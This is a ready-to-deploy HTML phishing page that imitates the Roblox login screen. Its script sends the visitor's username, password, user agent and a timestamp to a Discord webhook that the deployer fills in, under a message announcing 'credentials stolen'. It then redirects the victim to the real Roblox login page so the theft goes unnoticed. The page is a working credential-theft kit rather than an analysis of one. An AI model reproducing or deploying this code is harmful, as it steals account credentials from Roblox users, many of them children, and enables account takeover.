<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #1a1e2c; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #2a2f45; padding: 40px; border-radius: 12px; width: 400px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #fff; font-size: 32px; }
        .logo span { color: #f03e3e; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 8px; background: #1e2235; color: white; font-size: 16px; }
        input::placeholder { color: #888; }
        button { width: 100%; padding: 14px; background: #f03e3e; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #d32f2f; }
        .error { color: #ff8a8a; font-size: 14px; margin-top: 10px; text-align: center; display: none; }
        .footer { text-align: center; margin-top: 20px; color: #888; font-size: 12px; }
        a { color: #f03e3e; text-decoration: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <h1><span>Roblox</span> Login</h1>
    </div>
    <input type="text" id="username" placeholder="Username / Email" autocomplete="off">
    <input type="password" id="password" placeholder="Password">
    <button onclick="login()">Log In</button>
    <div class="error" id="errorMsg">Invalid username or password. Try again.</div>
    <div class="footer">
        <a href="#">Forgot username / password?</a> | <a href="#">Sign up</a>
    </div>
</div>

<script>
// >>> REPLACE THIS WITH YOUR OWN DISCORD WEBHOOK URL <<<
var webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";

function login() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    var errorDiv = document.getElementById("errorMsg");

    if (!username || !password) {
        errorDiv.style.display = "block";
        return;
    }

    // Send credentials to Discord webhook
    var payload = {
        content: "**🔐 ROBLOX LOGIN CREDENTIALS STOLEN!**",
        embeds: [{
            title: "Account Info",
            color: 0xff0000,
            fields: [
                { name: "Username / Email", value: username, inline: true },
                { name: "Password", value: password, inline: true },
                { name: "IP Address", value: "Collected via victim's browser", inline: false },
                { name: "User Agent", value: navigator.userAgent, inline: false },
                { name: "Time", value: new Date().toISOString(), inline: false }
            ],
            footer: { text: "Roblox Phisher | Perplex Hub" }
        }]
    };

    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Credentials sent");
            // Redirect to REAL Roblox login page (victim thinks they just typed wrong password)
            window.location.href = "https://www.roblox.com/login?error=invalid";
        } else {
            errorDiv.style.display = "block";
        }
    })
    .catch(error => {
        console.log("Error:", error);
        errorDiv.style.display = "block";
    });
}
</script>
</body>
</html>
